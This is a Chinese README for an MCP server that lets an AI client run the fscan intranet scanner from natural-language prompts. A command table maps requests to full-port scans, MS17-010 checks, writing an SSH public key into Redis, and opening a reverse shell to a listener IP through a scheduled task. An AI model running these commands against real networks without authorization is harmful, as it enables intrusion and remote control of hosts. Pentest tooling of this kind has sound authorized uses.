# Fscan MCP Server 模板
## 项目简介
Fscan MCP Server 是一个基于 **Model Context Protocol (MCP)** 的轻量级服务，旨在通过自然语言指令快速调用 **Fscan** 内网安全扫描工具。用户只需输入简单的中文提示（如 “帮我扫下 127.0.0.1 端口”），即可自动触发预设的 Fscan 命令，实现扫描任务的自动化执行。

### 核心功能
**自然语言触发**：支持通过中文指令直接调用 Fscan 扫描（如 “扫描 192.168.1.1/24 网段”）。
**内置命令模板**：预定义常见扫描场景（端口扫描、漏洞检测、服务爆破等），可快速扩展新指令。
**MCP 协议集成**：通过标准化协议与 MCP 客户端（如 Cursor、Claude Desktop）无缝对接，支持动态发现和安全权限控制。

## 安装指南
### 环境要求
Python 3.8+
MCP 客户端（如 [Cursor](https://www.cursor.so/) 或 [万径千机](https://github.com/xxx/wanjingqianji)）
需要在mcp_Server同目录下放置fscan.exe

### 步骤 1：安装依赖

```
pip install mcp==1.0.0
```

### 步骤 2：配置 MCP 客户端

以 **Cursor IDE** 为例：

创建配置文件 `mcp.config.json`：
```json
{
    "mcpServers": {
        "fscan-mcp-server": {
            "name": "Fscan 内网安全扫描工具",
            "command": "uv",
            "args": [
                "--directory",
                "${WORKSPACE}/fscan_MCP",
                "run",
                "--with",
                "mcp",
                "mcp",
                "run",
                "fscan_mcp_server.py"
            ],
            "disabled": false,
            "autoApprove": []
        }
    }
}
```
将配置文件导入 MCP 客户端（路径需根据实际项目调整）。

## 使用示例

### 触发指令

```
用户输入：帮我扫下127.0.0.1端口

模型调用：fscan.exe -h 127.0.0.1 -p 1-65535 -nopoc
```
## Fscan 功能支持

| 功能模块      | 指令示例                   | 对应 Fscan 命令                                     |
| --------- | ---------------------- | ----------------------------------------------- |
| 端口扫描      | 扫描 192.168.1.1 的 80 端口 | `fscan.exe -h 192.168.1.1 -p 80`                |
| 漏洞检测      | 检测 MS17-010 漏洞         | `fscan.exe -h 192.168.1.1 -m ms17010`           |
| Redis 写公钥 | 向 Redis 服务器写入 SSH 公钥   | `fscan.exe -h 192.168.1.1 -rf id_rsa.pub`       |
| 反弹 Shell  | 计划任务反弹 Shell           | `fscan.exe -h 192.168.1.1 -rs 192.168.1.2:6666` |

## 项目结构
```
├── fscan_mcp_server.py  # MCP 服务入口
├── commands.json       # 指令模板配置
└── README.md           # 文档
```

## 贡献指南
**添加新指令**：在 `commands.json` 中定义触发词和对应命令。
**优化逻辑**：修改 `fscan_mcp_server.py` 中的参数解析或响应处理。
**文档完善**：补充使用案例或配置说明。
## 许可证
本项目采用 **MIT 许可证**，详情见 [LICENSE](LICENSE)。

## 参考资料
[Fscan 官方文档](https://github.com/shadow1ng/fscan)
[MCP 协议规范](https://github.com/anthropic/mcp)
[MCP 客户端配置指南](https://www.cursor.so/docs/guides/mcp)
通过本模板，您可以快速构建自定义的 AI 驱动安全扫描工具链，实现从自然语言指令到复杂渗透测试任务的自动化执行。
